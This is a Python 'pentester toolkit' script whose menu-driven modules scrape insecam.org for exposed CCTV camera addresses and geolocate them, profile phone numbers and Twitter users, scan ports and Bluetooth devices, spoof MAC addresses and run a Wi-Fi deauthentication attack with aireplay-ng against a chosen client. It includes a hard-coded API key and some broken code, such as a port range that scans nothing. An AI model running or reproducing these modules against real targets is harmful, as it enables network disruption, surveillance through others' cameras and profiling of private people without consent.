#!/usr/bin/python3
# Author: m0rph3us1
# https://github.com/m0rph3us1

import subprocess, time, sys, re, os
from colorama import Fore
from sys import platform

print(Fore.CYAN+"""                                             		                         
                            @@@%%%%%%&@@@                       
                         @@@%%%%%%%%%%%%%@@@                    
                       @@%%%%%%%%%%%%%%%%%%%@@                  
                     @@%%%%%%%%%%%%%%%%%%%%%%%@@                
                    @@%%%%%%%%%%%%%%%%%%%%%%%%%@@               
                  /@%%%%%%%%%%%%%%%%%%%%%%%%%%%%&@(             
                  @@%%@@@@..................@@@@%%@@             
                 @@@@&@@%@.................@@@@&@@@@            
                  @@&&&@@@.................@@@&&&@@             
                   @@&&&&@@...............@@&&&&@@              
                    @@&&&&&@@...........@@&&&&&@@               
                     @@@&&&&@@@@.....@@@&&&&&@@,                
                     ,@@@@@@@@@.../...&@@@@@@@@,                
              @@.%%%%%%%%%%%%%%%@@@@@%%%%%%%%%%%%%%%#@@           
            @@                                      ...@@       
            ,@                  @@@@@              ....@@       
            %@&             @@ @@@@@@@ @@          ...(@%       
          @@%@@              .@@@@@@@@@.           ...@@%@@     
        @@%%%@@             #(@@((@((@@((          ...@@%%%@@   
        @@%%%%@.            @@@@((@((@@@@         ....@&%%%@@   
         @@%%%@@            @   @@@@@   @         ...@@%%%@@    
          @@%%@@                                  ...@@%%@@     
           @@*......................................,,,,@@          
	""")
print(Fore.MAGENTA + """
██████╗░███████╗███╗░░██╗████████╗███████╗░██████╗████████╗███████╗██████╗░
██╔══██╗██╔════╝████╗░██║╚══██╔══╝██╔════╝██╔════╝╚══██╔══╝██╔════╝██╔══██╗
██████╔╝█████╗░░██╔██╗██║░░░██║░░░█████╗░░╚█████╗░░░░██║░░░█████╗░░██████╔╝
██╔═══╝░██╔══╝░░██║╚████║░░░██║░░░██╔══╝░░░╚═══██╗░░░██║░░░██╔══╝░░██╔══██╗
██║░░░░░███████╗██║░╚███║░░░██║░░░███████╗██████╔╝░░░██║░░░███████╗██║░░██║
╚═╝░░░░░╚══════╝╚═╝░░╚══╝░░░╚═╝░░░╚══════╝╚═════╝░░░░╚═╝░░░╚══════╝╚═╝░░╚═╝

	  ████████╗░█████╗░░█████╗░██╗░░░░░██╗░░██╗██╗████████╗
	  ╚══██╔══╝██╔══██╗██╔══██╗██║░░░░░██║░██╔╝██║╚══██╔══╝
	  ░░░██║░░░██║░░██║██║░░██║██║░░░░░█████═╝░██║░░░██║░░░
	  ░░░██║░░░██║░░██║██║░░██║██║░░░░░██╔═██╗░██║░░░██║░░░
	  ░░░██║░░░╚█████╔╝╚█████╔╝███████╗██║░╚██╗██║░░░██║░░░
	  ░░░╚═╝░░░░╚════╝░░╚════╝░╚══════╝╚═╝░░╚═╝╚═╝░░░╚═╝░░░\n""")


## Linux main ##
def main():
	print("[1]  [2]  [3]  [4]  [5]  [6]  [7]  [8]  [9]  [10]  [11]  [12]  [13]  [14]\n")
	print("[15]  [16]  [17]  [18]  [19]  [20]  [21]\n")

	## PASSWORD GENERATOR ##
	def psswd_gen():
		print(Fore.CYAN + "[=] Running Module nº1: Password generator..." + Fore.WHITE)
		import string
		import random
		try:
			length = int(input("[?] Please enter the length of the password: "))

			ascii_lower = string.ascii_lowercase
			ascii_upper = string.ascii_uppercase
			ascii_digits = string.digits
			ascii_symbols = string.punctuation
			ascii_all = ascii_symbols + ascii_digits + ascii_upper + ascii_lower

			mix = random.sample(ascii_all, length)	
			password = "".join(mix)

			print("[+] Here's your new password: " + password)
		except ValueError:
			print("\n[-] Length has to be a int value, quitting...\n\n")

	## WORDLIST GENERATOR ##
	def wordlists():
		try:
			print(Fore.CYAN + "[=] Running Module nº2: Wordlist generator..." + Fore.WHITE)
			print("[?] Do you wish to specify a pattern? like a@@@@b = starts with and ends with b")
			print("[1] Yes")
			q = input("[2] No\n")
			if q == "1":
				number = input("[?] Please insert the number of characters you wish to use for the wordlist: ")
				chars = input("[?] Characters you wish to use for password: ")

				print("[?] Specify the name of the .txt you wish to use for new wordlist: ")
				file = input("[+] add .txt at the end, please\n")

				print("[?] The pattern you wish to use:")
				pattern = input("[+] Use @ for any character\n")

				print("[=] Generating wordlist ...")
				subprocess.run(["sudo", "crunch", number, number, chars,"-t", pattern, "-o", file])
			else:
				minimum = input("[?] Please insert the minimum characters of the password: ")
				maximum = input("[?] Please insert the maximum characters of the password: ")
				chars = input("[?] Characters you wish to use for password: ")
				
				print("[?] Specify the name of the .txt you wish to use for new wordlist: ")
				file = input("[+] add .txt at the end, please\n")
				
				print("[=] Generating wordlist ...")
				subprocess.run(["sudo", "crunch", minimum, maximum, chars, "-o", file])
		
		except KeyboardInterrupt:
			print("\n[-] Program ended by user: KeyboardInterrupt, quitting...\n\n")

	## DOMAIN/IP INFORMATION GATHERER ##
	def lookup():
		import requests

		print(Fore.CYAN + "[=] Running Module nº3: Domain/IP address information gathering..." + Fore.WHITE)

		web = "http://ip-api.com/json/"
		target = input("[?] Specify the IP address or the domain you wish to target: ")

		web += target
		response = requests.get(web).json()

		print("\n[=] Gathering information...")
		print("----------------------------")
		print("IP address: " + response['query'])
		print("Status: " + response['status'])
		print("Country/Code: " + response['country'] + response['countryCode'])
		print("City: " + response['city'])
		print("Timezone: " + response['timezone'])
		print("Latitude: " + str(response['lat']))
		print("Longitude: " + str(response['lon']))
		print("Domain: " + response['org'])
		print("ISP: " + response['isp'])
		print("-------------------------------------------\n")

	## WEBSITE INFORMATION GATHERING ##
	def web_info():
		import requests
		print(Fore.CYAN + "[=] Running Module nº4: Website Information Gathering..." + Fore.WHITE)
		try:
			host = input("[?] Specify the target using format https://google.com : ")
			url = requests.get(url=host)

			web = dict(url.headers)
			for x in web:
				print(x + " : " + web[x])
		except:
			print("\n[-] Host down or unreachable, quitting...\n")

	## PHONE INFORMATION GATHERING
	def phone():
		import requests
		import json

		print(Fore.CYAN + "[=] Running Module nº5: Phone Information gathering..." + Fore.WHITE)
		config_key = "83c4959db3119ceb89d4390911a5ce0e"

		number = input("[?] Please specify a phone you wish to target: ")

		web = "http://apilayer.net/api/validate?access_key=" + config_key + "&number=" + number + "&country_code=&format=1"

		output = requests.get(web)
		content = output.text
		obj = json.loads(content)
		country_name = obj['country_name']
		country_code = obj['country_code']
		carrier = obj['carrier']
		prefix = obj['country_prefix']
		line_type = obj['line_type']
		international_format = obj['international_format']

		print(Fore.CYAN + "\n[=] Gathering information...")
		print("---------------------------------------")
		print("Phone number: " + str(international_format))
		print("Country: " + str(country_name))
		print("Country Code: " + str(country_code))
		print("Country Prefix: " + str(prefix))
		print("Carrier: " + str(carrier))
		print("Line Type: " + str(line_type))
		print("---------------------------------------\n" + Fore.WHITE)

	## BASH USERNAME CHECKER	
	def usernames():
		subprocess.call("./usernames.sh")
		
	## TWEETER INFORMATION GATHERING with twint #
	def tweets():
		import twint
		import csv
		print(Fore.CYAN + "[=] Running Module nº7: Twitter information gathering..."+ Fore.WHITE)
		t = twint.Config()
		name_output = input("[?] Please specify a name for the output folder: ")
		t.Output = name_output
		print("[?] Please specify a limit for gathered tweets: ")
		limit = int(input("[+] Don't go above 3200\n"))
		t.Limit = limit
		t.Store_csv = True
		print("\n[?] What do you wish to search for: ")
		print("--------------------------------------------")
		print("[1]--User Tweets")
		def options():		
			choice = int(input("[2]--Location based Tweets\n"))
			if choice == 1:
				username = input("[?] Please specify the username you wish to target: ")
				t.Username = username
				## PAIN IN THE FUCKING ASS QUESTION
				def args():
					one_choice = input("[?] You wish to specify a hastag (Y/n): ")
					if one_choice.upper() == "Y":
						print("[?] Please, specify it: ")
						hastag = input("[+] remember to use # before keyword  ")
						t.Search = hastag
						t.Show_hastags = True
						two_choice = input("[?] You wish to specify a location to target (Y/n): ")
						if two_choice.upper() == "Y":
							location = input("[?] Please, specify it: ")
							t.Near = location

							three_choice = input("[?] You wish to specify a user that the original target tweeted to (Y/n): ")
							if three_choice.upper() == "Y":
								who = input("[?] Please, specify the user: ")
								t.To = who

								four_choice = input("[?] You wish to filter tweets sent since a specific date (Y/n): ")
								if four_choice.upper() == "Y":
									print("?] Please, specify it: ")
									since = input("[+] input as shown in this example: 2017-12-27   ")
									t.Since = since
									
									five_choice = input("[?] You wish to filter tweets sent until a specific date (Y/n): ")
									if five_choice.upper() == "Y":
										print("?] Please, specify it: ")
										until = input("[+] input as shown in this example: 2017-12-27   ")
										t.Until = until
									else:
										print("[=] Gathering tweets and storing them ")
								#4_1	
								else:
									five_choice = input("[?] You wish to filter tweets sent until a specific date (Y/n): ")
									if five_choice.upper() == "Y":
										print("?] Please, specify it: ")
										until = input("[+] input as shown in this example: 2017-12-27   ")
										t.Until = until
									else:
										print("[=] Gathering tweets and storing them ")
							#3_1
							else:
								four_choice = input("[?] You wish to filter tweets sent since a specific date (Y/n): ")
								if four_choice.upper() == "Y":
									print("?] Please, specify it: ")
									since = input("[+] input as shown in this example: 2017-12-27   ")
									t.Since = since
									
									five_choice = input("[?] You wish to filter tweets sent until a specific date (Y/n): ")
									if five_choice.upper() == "Y":
										print("?] Please, specify it: ")
										until = input("[+] input as shown in this example: 2017-12-27   ")
										t.Until = until
									else:
										print("[=] Gathering tweets and storing them ")
								else:
									five_choice = input("[?] You wish to filter tweets sent until a specific date (Y/n): ")
									if five_choice.upper() == "Y":
										print("?] Please, specify it: ")
										until = input("[+] input as shown in this example: 2017-12-27   ")
										t.Until = until
									else:
										print("[=] Gathering tweets and storing them ")
						#2_1
						else:
							three_choice = input("[?] You wish to specify a user that the original target tweeted to (Y/n): ")
							if three_choice.upper() == "Y":
								who = input("[?] Please, specify the user: ")
								t.To = who

								four_choice = input("[?] You wish to filter tweets sent since a specific date (Y/n): ")
								if four_choice.upper() == "Y":
									print("?] Please, specify it: ")
									since = input("[+] input as shown in this example: 2017-12-27   ")
									t.Since = since
									
									five_choice = input("[?] You wish to filter tweets sent until a specific date (Y/n): ")
									if five_choice.upper() == "Y":
										print("?] Please, specify it: ")
										until = input("[+] input as shown in this example: 2017-12-27   ")
										t.Until = until
									else:
										print("[=] Gathering tweets and storing them ")
								else:
									five_choice = input("[?] You wish to filter tweets sent until a specific date (Y/n): ")
									if five_choice.upper() == "Y":
										print("?] Please, specify it: ")
										until = input("[+] input as shown in this example: 2017-12-27   ")
										t.Until = until
									else:
										print("[=] Gathering tweets and storing them ")
							#3
							else:
								four_choice = input("[?] You wish to filter tweets sent since a specific date (Y/n): ")
								if four_choice.upper() == "Y":
									print("?] Please, specify it: ")
									since = input("[+] input as shown in this example: 2017-12-27   ")
									t.Since = since
									
									five_choice = input("[?] You wish to filter tweets sent until a specific date (Y/n): ")
									if five_choice.upper() == "Y":
										print("?] Please, specify it: ")
										until = input("[+] input as shown in this example: 2017-12-27   ")
										t.Until = until
									else:
										print("[=] Gathering tweets and storing them ")
								#4
								else:
									five_choice = input("[?] You wish to filter tweets sent until a specific date (Y/n): ")
									if five_choice.upper() == "Y":
										print("?] Please, specify it: ")
										until = input("[+] input as shown in this example: 2017-12-27   ")
										t.Until = until
									else:
										print("[=] Gathering tweets and storing them ")
					else:
						two_choice = input("[?] You wish to specify a location to target (Y/n): ")
						if two_choice.upper() == "Y":
							print("")
							location = input("[?] Please, specify it: ")
							t.Near = location
							three_choice = input("[?] You wish to specify a user that the original target tweeted to (Y/n): ")
							if three_choice.upper() == "Y":
								who = input("[?] Please, specify the user: ")
								t.To = who

								four_choice = input("[?] You wish to filter tweets sent since a specific date (Y/n): ")
								if four_choice.upper() == "Y":
									print("?] Please, specify it: ")
									since = input("[+] input as shown in this example: 2017-12-27   ")
									t.Since = since
									
									five_choice = input("[?] You wish to filter tweets sent until a specific date (Y/n): ")
									if five_choice.upper() == "Y":
										print("?] Please, specify it: ")
										until = input("[+] input as shown in this example: 2017-12-27   ")
										t.Until = until
									else:
										print("[=] Gathering tweets and storing them ")
							else:
								four_choice = input("[?] You wish to filter tweets sent since a specific date (Y/n): ")
								if four_choice.upper() == "Y":
									print("?] Please, specify it: ")
									since = input("[+] input as shown in this example: 2017-12-27   ")
									t.Since = since
									
									five_choice = input("[?] You wish to filter tweets sent until a specific date (Y/n): ")
									if five_choice.upper() == "Y":
										print("?] Please, specify it: ")
										until = input("[+] input as shown in this example: 2017-12-27   ")
										t.Until = until
								else:
									five_choice = input("[?] You wish to filter tweets sent until a specific date (Y/n): ")
									if five_choice.upper() == "Y":
										print("?] Please, specify it: ")
										until = input("[+] input as shown in this example: 2017-12-27   ")
										t.Until = until
									else:
										print("[=] Gathering tweets and storing them ")
						else:
							three_choice = input("[?] You wish to specify a user that the original target tweeted to (Y/n): ")
							if three_choice.upper() == "Y":
								who = input("[?] Please, specify the user: ")
								t.To = who

								four_choice = input("[?] You wish to filter tweets sent since a specific date (Y/n): ")
								if four_choice.upper() == "Y":
									print("?] Please, specify it: ")
									since = input("[+] input as shown in this example: 2017-12-27   ")
									t.Since = since
									
									five_choice = input("[?] You wish to filter tweets sent until a specific date (Y/n): ")
									if five_choice.upper() == "Y":
										print("?] Please, specify it: ")
										until = input("[+] input as shown in this example: 2017-12-27   ")
										t.Until = until
									else:
										print("[=] Gathering tweets and storing them ")
								else:
									five_choice = input("[?] You wish to filter tweets sent until a specific date (Y/n): ")
									if five_choice.upper() == "Y":
										print("?] Please, specify it: ")
										until = input("[+] input as shown in this example: 2017-12-27   ")
										t.Until = until
									else:
										print("[=] Gathering tweets and storing them ")
							else:
								four_choice = input("[?] You wish to filter tweets sent since a specific date (Y/n): ")
								if four_choice.upper() == "Y":
									print("?] Please, specify it: ")
									since = input("[+] input as shown in this example: 2017-12-27   ")
									t.Since = since
									
									five_choice = input("[?] You wish to filter tweets sent until a specific date (Y/n): ")
									if five_choice.upper() == "Y":
										print("?] Please, specify it: ")
										until = input("[+] input as shown in this example: 2017-12-27   ")
										t.Until = until
								else:
									five_choice = input("[?] You wish to filter tweets sent until a specific date (Y/n): ")
									if five_choice.upper() == "Y":
										print("?] Please, specify it: ")
										until = input("[+] input as shown in this example: 2017-12-27   ")
										t.Until = until
									else:
										print("[=] Gathering tweets and storing them ")
				args()
				twint.run.Search(t)
				print(f"[+] RESULTS STORED IN {name_output} FOLDER\n\n")   
			elif choice == 2:
				location = input("[?] Please, specify it: ")
				t.Near = location
				four_choice = input("[?] You wish to filter tweets sent since a specific date (Y/n): ")
				if four_choice.upper() == "Y":
					print("?] Please, specify it: ")
					since = input("[+] input as shown in this example: 2017-12-27   ")
					t.Since = since
								
					five_choice = input("[?] You wish to filter tweets sent until a specific date (Y/n): ")
					if five_choice.upper() == "Y":
						print("?] Please, specify it: ")
						until = input("[+] input as shown in this example: 2017-12-27   ")
						t.Until = until
					else:
						print("[=] Gathering tweets and storing them ")
				else:
					five_choice = input("[?] You wish to filter tweets sent until a specific date (Y/n): ")
					if five_choice.upper() == "Y":
						print("?] Please, specify it: ")
						until = input("[+] input as shown in this example: 2017-12-27   ")
						t.Until = until
					else:
						print("[=] Gathering tweets and storing them ")
				twint.run.Search(t)
				print(f"[+] RESULTS STORED IN {name_output} FOLDER\n\n")
			else:
				print("\n[-] None chosen, quitting...\n\n")
		def simplify():
			import os
			import pandas as pd
			class cd:
			    def __init__(self, newPath):
			        self.newPath = os.path.expanduser(newPath)
			    def __enter__(self):
			        self.savedPath = os.getcwd()
			        os.chdir(self.newPath)
			    def __exit__(self, etype, value, traceback):
			        os.chdir(self.savedPath)		
			with cd(f"./{name_output}"):
				with open('tweets.csv', 'rt', encoding='utf8') as csvfile:
					content = csv.reader(csvfile)
					data = list(content)
				
				file = open("simplified_tweets.txt", 'w')
				for row in data:
					file.writelines(row[3] + " | " +row[4] + " | " +row[7] + " | " + row[10] +'\n')
				file.close()
				# Convert csv to html file
				a = pd.read_csv("tweets.csv")
				a.to_html("tweets.html")
				html_file = a.to_html()
   		
		options()
		simplify()

	## CCTV CAMERAS by https://github.com/AngelSecurityTeam and filtered by city by me
	def cameras():
		import requests
		
		print(Fore.CYAN + "[=] Running module nº8, Security IP City Cameras..."+ Fore.WHITE)
		print(Fore.RED + "[+] Many thanks to AngelSecurityTeam at https://github.com/AngelSecurityTeam for the original script"+ Fore.WHITE)
		print("[?] Please choose a specific country you wish to target: ")
		print(Fore.CYAN + """
        1) United States                31) Mexico                61) Moldova
        2) Japan                        32) Finland               62) Nicaragua
        3) Italy                        33) China                 63) Malta
        4) Korea                        34) Chile                 64) Trinidad And Tobago
        5) France                       35) South Africa          65) Soudi Arabia
        6) Germany                      36) Slovakia              66) Croatia
        7) Taiwan                       37) Hungary               67) Cyprus
        8) Russian Federation           38) Ireland               68) Pakistan
        9) United Kingdom               39) Egypt                 69) United Arab Emirates
        10) Netherlands                 40) Thailand              70) Kazakhstan
        11) Czech Republic              41) Ukraine               71) Kuwait
        12) Turkey                      42) Serbia                72) Venezuela
        13) Austria                     43) Hong Kong             73) Georgia
        14) Switzerland                 44) Greece                74) Montenegro
        15) Spain                       45) Portugal              75) El Salvador
        16) Canada                      46) Latvia                76) Luxembourg
        17) Sweden                      47) Singapore             77) Curacao
        18) Israel                      48) Iceland               78) Puerto Rico
        19) Iran                        49) Malaysia              79) Costa Rica
        20) Poland                      50) Colombia              80) Belarus
        21) India                       51) Tunisia               81) Albania
        22) Norway                      52) Estonia               82) Liechtenstein
        23) Romania                     53) Dominican Republic    83) Bosnia And Herzegovia
        24) Vietnam                     54) Sloveania             84) Paraguay
        25) Belgium                     55) Ecuador               85) Philippines
        26) Brazil                      56) Lithuania             86) Faroe Islands
        27) Bulgaria                    57) Palestinian           87) Guatemala
        28) Indonesia                   58) New Zealand           88) Nepal
        29) Denmark                     59) Bangladeh             89) Peru
        30) Argentina                   60) Panama                90) Uruguay
                                                                  91) Extra
        """ + Fore.WHITE)
		try:
		    print()
		    countries = ["US", "JP", "IT", "KR", "FR", "DE", "TW", "RU", "GB", "NL",
		                 "CZ", "TR", "AT", "CH", "ES", "CA", "SE", "IL", "PL", "IR",
		                 "NO", "RO", "IN", "VN", "BE", "BR", "BG", "ID", "DK", "AR",
		                 "MX", "FI", "CN", "CL", "ZA", "SK", "HU", "IE", "EG", "TH",
		                 "UA", "RS", "HK", "GR", "PT", "LV", "SG", "IS", "MY", "CO",
		                 "TN", "EE", "DO", "SI", "EC", "LT", "PS", "NZ", "BD", "PA",
		                 "MD", "NI", "MT", "IT", "SA", "HR", "CY", "PK", "AE", "KZ",
		                 "KW", "VE", "GE", "ME", "SV", "LU", "CW", "PR", "CR", "BY",
		                 "AL", "LI", "BA", "PY", "PH", "FO", "GT", "NP", "PE", "UY",
		                 "-"]
		    headers = {"User-Agent": "Mozilla/5.0 (X11; Linux i686; rv:68.0) Gecko/20100101 Firefox/68.0"}
		    num = int(input("[?] What country will it be : "))
		    print("[=] Gathering CCTV Cameras, please wait...")
		    if num not in range(1, 91+1):
		        raise IndexError

		    country = countries[num-1]
		    res = requests.get(
		        f"https://www.insecam.org/en/bycountry/{country}", headers=headers
		    )
		    last_page = re.findall(r'pagenavigator\("\?page=", (\d+)', res.text)[0]
		    for page in range(int(last_page)):
		        res = requests.get(
		            f"https://www.insecam.org/en/bycountry/{country}/?page={page}",
		            headers=headers
		        )
		        find_ip = re.findall(r"http://\d+.\d+.\d+.\d+:\d+", res.text)
		        for ip in find_ip:
		            ip_list = []
		            ip_list.append(ip)
		            ip_list = ' '.join(ip_list).replace('http://','').split()
		            for single in ip_list:
		            	ip_port = single
		            	single, sep, tail = single.partition(':')
		            	web = "http://ip-api.com/json/"
		            	target = single
		            	web += target
		            	response = requests.get(web).json()
		            	camera = "http://" + ip_port
		            	loc = response['city']
		            	separator = "|"
		            	#print(Fore.CYAN + "http://" + ip_port + "   |   " + loc + Fore.WHITE)
		            	print(Fore.CYAN + '{0:30}{1:10}{2:10}'.format(camera,separator, loc) + Fore.WHITE)

		except ValueError:
		    print("\n[-] Quitting...\n\n")
		except KeyboardInterrupt:
			print("\n[-] Program interrumpted by user, quitting...\n")
		finally:
		    exit()
	
	## BASIC WEB SERVER VULN SCANNER W/ Nikto
	def vuln_web():
		print(Fore.CYAN + "[=] Running Module nº9: Web server Vulnerability Scanner..." + Fore.WHITE)

		try:
			host = input("[?] Please specify the host you wish to target: ")
			subprocess.run(["sudo", "nikto", "-h", host])
			print("\n")
		except KeyboardInterrupt:
			print("[-] Program interrumpted by user, quitting...")
		
		except ValueError:
			print("[-] Wrong value given, quitting...")

	## BLUETOOTH SCANNER ##
	def bluetooth():
		print(Fore.CYAN + "[=] Running Module nº10: Bluetooth scanner..." + Fore.WHITE)
		interface = input("[?] Please input the interface you wish to use: ")
		subprocess.run(["sudo", "hciconfig", "up"])
		
		print("\n[=] Scanning bluetooth devices nearby...")
		print("----------------------------------------\n")
		subprocess.run(["sudo", "hcitool", "scan"])
		
		target = input("\n[?] Please specify the MAC address of your desired target: ")
		
		print("\n[=] Gathering information about target device...")
		print("------------------------------------------------\n")
		subprocess.run(["sudo", "hcitool", "info", target])
		print("\n\n")
		try:
			option = input("[?] You wish to ping the device (Y/n): ")
			if option.upper() == "Y":
				print("\n[=] Sending ping to target device...")
				print("------------------------------------\n")
				subprocess.run(["sudo", "l2ping", target])
				print("\n\n")
			else:
				print("\n[-] Program reached end, quitting...\n\n")
		except KeyboardInterrupt:
			print("\n[-] Program ended by user, quitting...\n\n")
		except ValueError:
			print("\n Wrong value type given, quitting...\n\n")
		
	## MAC ADDRESS CHANGER ##
	def mac_changer():
		print(Fore.CYAN + "[=] Running Module nº11: MAC address changer..." + Fore.WHITE)
		interface = input("[?] Please input the name of the interface you wish to change it's MAC address: ")
		subprocess.run(["sudo", "ifconfig", interface, "down"])
		subprocess.run(["sudo", "macchanger", "-A", interface])
		subprocess.run(["ifconfig", interface, "up"])

	## NETWORK SCANNER ##
	def net_scan():
		import scapy.all as scapy
		print(Fore.CYAN + "[=] Running Module nº12: Network Scanner..." + Fore.WHITE)
		print("[?] Please enter the range of your subnet: ")
		ip_range = input("[+] Format: 192.168.1.1/24\n")
		
		arp_result = scapy.arping(ip_range)
		print("-------------------------------------")
		print("  MAC address	    Vendor  IP\n\n")
		print("[-] Scan finished. If it failed to discover hosts, run it again\n\n")

	## 	PORT SCANNER ##
	def port_scan():
		print(Fore.CYAN + "[=] Running Module nº13: Open Port Scanner..." + Fore.WHITE)
		import socket, time
		from datetime import datetime
		target = input("[?] Specify the target ip address: ")
		print("-----------------------------------------")
		print("Scanning target: " + target)
		print("Time started: " + str(datetime.now()))
		print("-----------------------------------------\n")
		
		# SCANNER FUNCTION
		def scanner(port):
			try:
				sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
				sock.settimeout(0.5)
				sock.connect((target, port))
				sock.close()
				return True
			except:
				return False
		print("\n[=] Scanning common ports...")
		print("----------------------------")

		# Common Ports
		common_ports = {
		 
			'21': 'FTP',
			'22': 'SSH',
			'23': 'TELNET',
			'25': 'SMTP',
			'53': 'DNS',
			'69': 'TFTP',
			'80': 'HTTP',
			'109': 'POP2',
			'110': 'POP3',
			'123': 'NTP',
			'137': 'NETBIOS-NS',
			'138': 'NETBIOS-DGM',
			'139': 'NETBIOS-SSN',
			'143': 'IMAP',
			'156': 'SQL-SERVER',
			'389': 'LDAP',
			'443': 'HTTPS',
			'546': 'DHCP-CLIENT',
			'547': 'DHCP-SERVER',
			'995': 'POP3-SSL',
			'993': 'IMAP-SSL',
			'2086': 'WHM/CPANEL',
			'2087': 'WHM/CPANEL',
			'2082': 'CPANEL',
			'2083': 'CPANEL',
			'3306': 'MYSQL',
			'8443': 'PLESK',
			'10000': 'VIRTUALMIN/WEBMIN'
		}

		for p, service in common_ports.items():
			port = int(p)
			result = scanner(port)
			if result == True:
				print("[+] Port "+ p + " running " + service +" service, is open!")
			else:
				pass

		# RANGE SCAN
		try:
			print("\n[?] Do you wish to scan a specific port range:")
			print("------------------------------------------------")
			print("[1] Port Range")
			print("[2] Quit")
			question = int(input("------------------------------------------------\n"))

			# RANGE
			if question == 1:
				print("\nPORT Ranges")
				print("----------------")
				print("[1] 1-500 ")
				print("[2] 500-1000")
				print("[3] 1000-1500")
				print("[4] 1500-2000")
				print("[5] 2000-2500")
				print("[6] 2500-3000")
				print("[7] 3000-3500")
				print("[8] 3500-4000")
				print("[9] 4000-4500")
				print("[10] 4500-5000")
				print("[11] 5000-5500")
				print("[12] 5500-6000")
				print("[13] 6000-6500")
				print("[14] 6500-7000")
				print("[15] 7000-7500")
				print("[16] 7500-8000")
				print("[17] 8000-8500")
				print("[18] 8500-9000")
				print("[19] 9000-9500")
				print("[20] 9500-10000")
				print("----------------")
				range_choosen = int(input("[+] What's the desired range you wish to scan 1 - 20: "))
				print("\n")
				if range_choosen == 1:
					for i in range(1, 500):
						result = scanner(i)
						if result == True:
							print("[+] Port "+ str(i) + " is open!" )
						else:
							pass
				if range_choosen == 2:
					for i in range(500, 1000):
						result = scanner(i)
						if result == True:
							print("[+] Port "+ str(i) + " is open!" )
						else:
							pass
				if range_choosen == 3:
					for i in range(1000, 1500):
						result = scanner(i)
						if result == True:
							print("[+] Port "+ str(i) + " is open!" )
						else:
							pass
				if range_choosen == 4:
					for i in range(1500, 2000):
						result = scanner(i)
						if result == True:
							print("[+] Port "+ str(i) + " is open!" )
						else:
							pass
				if range_choosen == 5:
					for i in range(2000, 2500):
						result = scanner(i)
						if result == True:
							print("[+] Port "+ str(i) + " is open!" )
						else:
							pass
				if range_choosen == 6:
					for i in range(2500, 3000):
						result = scanner(i)
						if result == True:
							print("[+] Port "+ str(i) + " is open!" )
						else:
							pass
				if range_choosen == 7:
					for i in range(3000, 3500):
						result = scanner(i)
						if result == True:
							print("[+] Port "+ str(i) + " is open!" )
						else:
							pass
				if range_choosen == 8:
					for i in range(3500, 4000):
						result = scanner(i)
						if result == True:
							print("[+] Port "+ str(i) + " is open!" )
						else:
							pass
				if range_choosen == 9:
					for i in range(4000, 4500):
						result = scanner(i)
						if result == True:
							print("[+] Port "+ str(i) + " is open!" )
						else:
							pass
				if range_choosen == 10:
					for i in range(4500, 5000):
						result = scanner(i)
						if result == True:
							print("[+] Port "+ str(i) + " is open!" )
						else:
							pass
				if range_choosen == 11:
					for i in range(5000, 5500):
						result = scanner(i)
						if result == True:
							print("[+] Port "+ str(i) + " is open!" )
						else:
							pass
				if range_choosen == 12:
					for i in range(5500, 6000):
						result = scanner(i)
						if result == True:
							print("[+] Port "+ str(i) + " is open!" )
						else:
							pass
				if range_choosen == 13:
					for i in range(6000, 6500):
						result = scanner(i)
						if result == True:
							print("[+] Port "+ str(i) + " is open!" )
						else:
							pass
				if range_choosen == 14:
					for i in range(6500, 7000):
						result = scanner(i)
						if result == True:
							print("[+] Port "+ str(i) + " is open!" )
						else:
							pass
				if range_choosen == 15:
					for i in range(7000, 7500):
						result = scanner(i)
						if result == True:
							print("[+] Port "+ str(i) + " is open!" )
						else:
							pass
				if range_choosen == 16:
					for i in range(8500, 8000):
						result = scanner(i)
						if result == True:
							print("[+] Port "+ str(i) + " is open!" )
						else:
							pass
				if range_choosen == 17:
					for i in range(8000, 8500):
						result = scanner(i)
						if result == True:
							print("[+] Port "+ str(i) + " is open!" )
						else:
							pass
				if range_choosen == 18:
					for i in range(8500, 9000):
						result = scanner(i)
						if result == True:
							print("[+] Port "+ str(i) + " is open!" )
						else:
							pass
				if range_choosen == 19:
					for i in range(9000, 9500):
						result = scanner(i)
						if result == True:
							print("[+] Port "+ str(i) + " is open!" )
						else:
							pass
				if range_choosen == 20:
					for i in range(9500, 10000):
						result = scanner(i)
						if result == True:
							print("[+] Port "+ str(i) + " is open!" )
						else:
							pass
			elif question == 2:
				print("[-] Goodbye")		
			else:
				print("[-] None chosen, Goodbye!\n\n")		
		except KeyboardInterrupt:
			print("\n[-] Program ended by user, quitting...\n\n")
		except ValueError:
			print("\n[-] None chosen, Goodbye!\n\n")

	## DEAUTHORIZATION ATTACK
	def deauth_attack():
		print("[=] Running Module nº14: Target Deauthorization Attack...")
		print("[?] Do you wish to scan networks or skip to attack")
		print("--------------------------------------------------")
		print("[1] Scan")
		choice = int(input("[2] Skip to attack\n"))
		if choice == 1:
			try:
				print("\n[+] Use Ctrl + c at any time to quit scan and proceed to deauth attack.")
				interface = input("\n[?] Please specify the interface you wish to use: ")
				subprocess.run(["ifconfig", interface, "down"])
				# Kill processes in network
				subprocess.run(["sudo", "airmon-ng", "check", "kill"])
				subprocess.run(["iwconfig", interface, "mode", "monitor"])
				subprocess.run(["ifconfig", interface, "up"])
				try:
					print("[?] Check for 2G or 5G networks?")
					print("--------------------------------")
					print("[1] 2.4 Ghz Networks")
					print("[2] 5 Ghz Networks")
					band = int(input("[3] Both bands (slower speed)\n"))
					if band == 1:
						subprocess.run(["sudo", "airodump-ng", interface])
					elif band ==2:
						subprocess.run(["sudo", "airodump-ng", "--band", "a", interface])
					elif band ==3:
						subprocess.run(["sudo", "airodump-ng", "--band", "abg", interface])
					else:
						print("[-] None of the above chosen, quitting program")
				except ValueError:
					print("[-] None of the above chosen, quitting program")
			except KeyboardInterrupt:
				try:
					print("[?] Please specify the details of your desired network:")
					print("-------------------------------------------------------")
					bssid = input("[?] Access Point BSSID: ")
					channel = input("[?] Channel used: ")
					print("[+] Ctrl + c to proceed when you wish")

					subprocess.run(["sudo", "airodump-ng", "--bssid", bssid, "--channel", channel, interface])

				except KeyboardInterrupt:
					try:
						target_bssid = input("[?] Client MAC address you wish to target: ")
						print("[=] Running Deauth attack...\n\n")

						subprocess.run(["sudo", "aireplay-ng", "--deauth", "100000000000", "-a", bssid, "-c", target_bssid, interface])
					except KeyboardInterrupt:
						print("[-] Program finished, restoring network for target...\n\n")
						subprocess.run(["sudo", "airmon-ng", "stop", interface])
						subprocess.run(["sudo", "ifconfig", interface, "down"])
						subprocess.run(["sudo", "iwconfig", interface, "mode", "managed"])
